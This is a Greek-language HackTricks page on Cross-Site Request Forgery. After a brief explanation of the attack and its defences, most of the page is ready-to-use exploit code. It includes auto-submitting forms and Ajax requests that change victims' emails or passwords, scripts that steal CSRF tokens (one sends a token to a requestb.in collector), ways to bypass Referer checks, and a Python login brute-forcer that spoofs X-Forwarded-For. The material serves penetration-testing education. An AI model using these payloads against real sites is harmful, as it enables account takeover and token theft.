# CSRF (Cross Site Request Forgery)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Συμμετέχετε στον [**Διακομιστή Discord του HackenProof**](https://discord.com/invite/N3FrSbmwdy) για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Χάκινγκ**\
Ασχοληθείτε με περιεχόμενο που εξετάζει την αγωνία και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενημερωμένοι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενήμεροι με τις νεότερες ανταμοιβές ευρημάτων και τις κρίσιμες ενημερώσεις πλατφόρμας

**Ελάτε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) και αρχίστε να συνεργάζεστε με κορυφαίους χάκερ σήμερα!

## Εξήγηση Cross-Site Request Forgery (CSRF)

Το **Cross-Site Request Forgery (CSRF)** είναι ένας τύπος ευπάθειας ασφαλείας που βρίσκεται σε web εφαρμογές. Επιτρέπει σε επιτιθέμενους να εκτελούν ενέργειες εκ μέρους ανυποψίαστων χρηστών εκμεταλλευόμενοι τις πιστοποιημένες συνεδρίες τους. Η επίθεση εκτελείται όταν ένας χρήστης, που είναι συνδεδεμένος σε μια πλατφόρμα θύματος, επισκέπτεται ένα κακόβουλο site. Αυτό το site στη συνέχεια ενεργοποιεί αιτήσεις προς τον λογαριασμό του θύματος μέσω μεθόδων όπως η εκτέλεση JavaScript, η υποβολή φορμών ή η ανάκτηση εικόνων.

### Προϋποθέσεις για μια Επίθεση CSRF

Για να εκμεταλλευτεί μια ευπάθεια CSRF, πρέπει να πληρούνται αρκετές συνθήκες:

1. **Αναγνώριση Μιας Πολύτιμης Ενέργειας**: Ο επιτιθέμενος πρέπει να βρει μια ενέργεια αξίας για εκμετάλλευση, όπως η αλλαγή του κωδικού πρόσβασης του χρήστη, του email ή η ανύψωση προνομίων.
2. **Διαχείριση Συνεδρίας**: Η συνεδρία του χρήστη πρέπει να διαχειρίζεται μόνο μέσω cookies ή της κεφαλίδας HTTP Basic Authentication, καθώς άλλες κεφαλίδες δεν μπορούν να χειριστούν γι' αυτό το σκοπό.
3. **Απουσία Απρόβλεπτων Παραμέτρων**: Η αίτηση δεν πρέπει να περιέχει απρόβλεπτες παραμέτρους, καθώς μπορούν να αποτρέψουν την επίθεση.

### Γρήγορος Έλεγχος

Μπορείτε να **καταγράψετε την αίτηση στο Burp** και να ελέγξετε τις προστασίες CSRF και για να δοκιμάσετε από τον περιηγητή μπορείτε να κάνετε κλικ στο **Αντιγραφή ως fetch** και να ελέγξετε την αίτηση:

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### Προστασία Ενάντια στο CSRF

Μπορούν να εφαρμοστούν διάφορα μέτρα για την προστασία από επιθέσεις CSRF:

* [**Cookies με ίδια προέλευση (SameSite cookies)**](hacking-with-cookies/#samesite): Αυτή η ιδιότητα εμποδίζει τον περιηγητή να στέλνει cookies μαζί με αιτήσεις από διαφορετικές τοποθεσίες. [Περισσότερα για τα Cookies με ίδια προέλευση](hacking-with-cookies/#samesite).
* [**Κοινή χρήση πόρων διαφορετικής προέλευσης (Cross-origin resource sharing)**](cors-bypass.md): Η πολιτική CORS της ιστοσελίδας θύματος μπορεί να επηρεάσει την εφικτότητα της επίθεσης, ειδικά αν η επίθεση απαιτεί την ανάγνωση της απάντησης από την ιστοσελίδα θύματος. [Μάθετε για την παράκαμψη CORS](cors-bypass.md).
* **Επαλήθευση Χρήστη**: Η ζήτηση του κωδικού πρόσβασης του χρήστη ή η επίλυση ενός captcha μπορεί να επιβεβαιώσει την πρόθεση του χρήστη.
* **Έλεγχος Κεφαλίδων Referrer ή Origin**: Η επικύρωση αυτών των κεφαλίδων μπορεί να βοηθήσει στη διασφάλιση ότι οι αιτήσεις προέρχονται από αξιόπιστες πηγές. Ωστόσο, η προσεκτική δημιουργία των διευθύνσεων URL μπορεί να παρακάμψει κακά υλοποιημένους ελέγχους, όπως:
* Χρήση `http://mal.net?orig=http://example.com` (η διεύθυνση URL τελειώνει με την αξιόπιστη διεύθυνση URL)
* Χρήση `http://example.com.mal.net` (η διεύθυνση URL ξεκινά με την αξιόπιστη διεύθυνση URL)
* **Τροποποίηση Ονομάτων Παραμέτρων**: Η τροποποίηση των ονομάτων των παραμέτρων σε αιτήσεις POST ή GET μπορεί να βοηθήσει στην πρόληψη αυτοματοποιημένων επιθέσεων.
* **Διακριτικά CSRF**: Η ενσωμάτωση ενός μοναδικού διακριτικού CSRF σε κάθε συνεδρία και η απαίτηση αυτού του διακριτικού σε μετέπειτα αιτήσεις μπορεί να μειώσει σημαντικά τον κίνδυνο CSRF. Η αποτελεσματικότητα του διακριτικού μπορεί να ενισχυθεί με την επιβολή του CORS.

Η κατανόηση και η εφαρμογή αυτών των αμυντικών μέτρων είναι κρίσιμη για τη διατήρηση της ασφάλειας και της ακεραιότητας των web εφαρμογών.

## Παράκαμψη Αμυνών

### Από POST σε GET

Ίσως η φόρμα που θέλετε να καταχωρήσετε είναι προετοιμασμένη για αποστολή μιας **POST αίτησης με ένα CSRF διακριτικό αλλά**, πρέπει να **ελέγξετε** αν ένα **GET** είναι επίσης **έγκυρο** και αν όταν στέλνετε μια GET αίτηση το **CSRF διακριτικό εξακριβώνεται ακόμα**.

### Έλλειψη
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
Σημειώστε ότι αν το **csrf token σχετίζεται με το session cookie αυτή η επίθεση δεν θα λειτουργήσει** επειδή θα χρειαστεί να ορίσετε στο θύμα το session σας, και συνεπώς θα επιτεθείτε στον εαυτό σας.
{% endhint %}

### Αλλαγή Content-Type

Σύμφωνα με [**αυτό**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), προκειμένου να **αποφευχθούν οι προερωτήσεις** χρησιμοποιώντας τη μέθοδο **POST** αυτές είναι οι επιτρεπόμενες τιμές Content-Type:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

Ωστόσο, σημειώστε ότι η **λογική των διακομιστών μπορεί να ποικίλει** ανάλογα με το **Content-Type** που χρησιμοποιείται, επομένως θα πρέπει να δοκιμάσετε τις αναφερόμενες τιμές και άλλες όπως **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Παράδειγμα (από [εδώ](https://brycec.me/posts/corctf\_2021\_challenges)) αποστολής δεδομένων JSON ως text/plain:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### Παράκαμψη Αιτημάτων Προελέγχου για Δεδομένα JSON

Κατά την προσπάθεια αποστολής δεδομένων JSON μέσω ενός αιτήματος POST, η χρήση του `Content-Type: application/json` σε ένα φόρμα HTML δεν είναι άμεσα δυνατή. Επίσης, η χρήση του `XMLHttpRequest` για την αποστολή αυτού του τύπου περιεχομένου ενεργοποιεί ένα αίτημα προελέγχου. Ωστόσο, υπάρχουν στρατηγικές για πιθανή παράκαμψη αυτού του περιορισμού και έλεγχος εάν ο διακομιστής επεξεργάζεται τα δεδομένα JSON ανεξαρτήτως του Content-Type:

1. **Χρήση Εναλλακτικών Τύπων Περιεχομένου**: Χρησιμοποιήστε `Content-Type: text/plain` ή `Content-Type: application/x-www-form-urlencoded` θέτοντας `enctype="text/plain"` στη φόρμα. Με αυτήν την προσέγγιση ελέγχεται εάν το backend χρησιμοποιεί τα δεδομένα ανεξαρτήτως του Content-Type.
2. **Τροποποίηση Τύπου Περιεχομένου**: Για να αποφύγετε ένα αίτημα προελέγχου ενώ εξασφαλίζετε ότι ο διακομιστής αναγνωρίζει το περιεχόμενο ως JSON, μπορείτε να στείλετε τα δεδομένα με `Content-Type: text/plain; application/json`. Αυτό δεν ενεργοποιεί ένα αίτημα προελέγχου αλλά ενδέχεται να επεξεργαστεί σωστά από τον διακομιστή αν είναι ρυθμισμένος να δέχεται `application/json`.
3. **Χρήση Αρχείου Flash SWF**: Μια λιγότερο συνηθισμένη αλλά εφικτή μέθοδος περιλαμβάνει τη χρήση ενός αρχείου Flash SWF για την παράκαμψη τέτοιων περιορισμών. Για μια λεπτομερή κατανόηση αυτής της τεχνικής, ανατρέξτε σε [αυτήν την ανάρτηση](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Παράκαμψη Έλεγχου Αναφορέα / Προέλευσης

**Αποφυγή Κεφαλίδας Αναφορέα**

Οι εφαρμογές μπορεί να επικυρώνουν την κεφαλίδα 'Referer' μόνο όταν είναι παρούσα. Για να αποτρέψετε ένα πρόγραμμα περιήγησης από το να στείλει αυτήν την κεφαλίδα, μπορεί να χρησιμοποιηθεί το ακόλουθο HTML meta tag:
```xml
<meta name="referrer" content="never">
```
Αυτό εξασφαλίζει ότι ο κεφαλίδα 'Referer' παραλείπεται, πιθανώς παρακάμπτοντας τους ελέγχους επικύρωσης σε μερικές εφαρμογές.

**Παράκαμψη με Regexp**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Για να ορίσετε το όνομα του τομέα του διακομιστή στο URL που το Referrer θα στείλει μέσα στις παραμέτρους, μπορείτε να κάνετε:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **Παράκαμψη μεθόδου HEAD**

Στο πρώτο μέρος του [**αυτού του CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) εξηγείται ότι [ο πηγαίος κώδικας του Oak](https://github.com/oakserver/oak/blob/main/router.ts#L281), ένας δρομολογητής είναι ρυθμισμένος να **χειρίζεται τα αιτήματα HEAD ως αιτήματα GET** χωρίς σώμα απάντησης - μια συνηθισμένη παράκαμψη που δεν είναι μοναδική για το Oak. Αντί για έναν συγκεκριμένο χειριστή που ασχολείται με τα αιτήματα HEAD, απλά **δίνονται στον χειριστή GET αλλά η εφαρμογή απλά αφαιρεί το σώμα απάντησης**.

Συνεπώς, αν ένα αίτημα GET περιορίζεται, μπορείτε απλά **να στείλετε ένα αίτημα HEAD που θα επεξεργαστεί ως αίτημα GET**.

## **Παραδείγματα Εκμετάλλευσης**

### **Εξυφαίροντας το CSRF Token**

Αν ένα **CSRF token** χρησιμοποιείται ως **άμυνα** μπορείτε να προσπαθήσετε να το **εξυφαίρετε** καταχρώντας μια [**ευπάθεια XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) ή μια [**Κρεμαστή Σήμανση**](dangling-markup-html-scriptless-injection/) ευπάθεια.

### **GET χρησιμοποιώντας ετικέτες HTML**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Άλλες ετικέτες HTML5 που μπορούν να χρησιμοποιηθούν για να στείλουν αυτόματα ένα αίτημα GET είναι:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### Αίτημα GET φόρμας
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Αίτημα POST φόρμας
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Αίτημα POST φόρμας μέσω iframe
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Αίτημα Ajax POST**
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST request

### Αίτημα POST multipart/form-data
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST request v2
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Αίτημα POST φόρμας από μέσα σε ένα iframe
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Κλοπή CSRF Token και αποστολή αιτήματος POST**
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **Κλοπή CSRF Token και αποστολή αιτήματος Post χρησιμοποιώντας ένα iframe, ένα φόρμα και Ajax**
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Κλοπή CSRF Token και αποστολή αιτήματος POST χρησιμοποιώντας ένα iframe και ένα φόρμα**
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Κλοπή του τεκμηρίου και αποστολή μέσω 2 iframes**
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **Κλοπή CSRF τεκμηρίου με Ajax και αποστολή ενός post με ένα φόρμα**
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF με το Socket.IO
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF Χτύπημα Βίας Σύνδεσης

Ο κώδικας μπορεί να χρησιμοποιηθεί για Βίαιη Επίθεση σε ένα φόρμα σύνδεσης χρησιμοποιώντας ένα CSRF τεκμήριο (Χρησιμοποιεί επίσης την κεφαλίδα X-Forwarded-For για να προσπαθήσει να παρακάμψει μια πιθανή μαύρη λίστα IP):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Εργαλεία <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Αναφορές

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

​

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Συμμετέχετε στον [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) διακομιστή για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Hacking**\
Ασχοληθείτε με περιεχόμενο που εξερευνά την αγωνία και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενήμεροι με τον γρήγορα εξελισσόμενο κόσμο του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενήμεροι με τις νεότερες ανακοινώσεις για νέες αμοιβές ευρημάτων και κρίσιμες ενημερώσεις πλατφόρμας

**Συμμετέχετε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) και αρχίστε να συνεργάζεστε με κορυφαίους χάκερ σήμερα!

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετέχετε** 💬 στην ομάδα [**Discord**](https://discord.gg/hRep4RUj7f) ή στην ομάδα [**telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
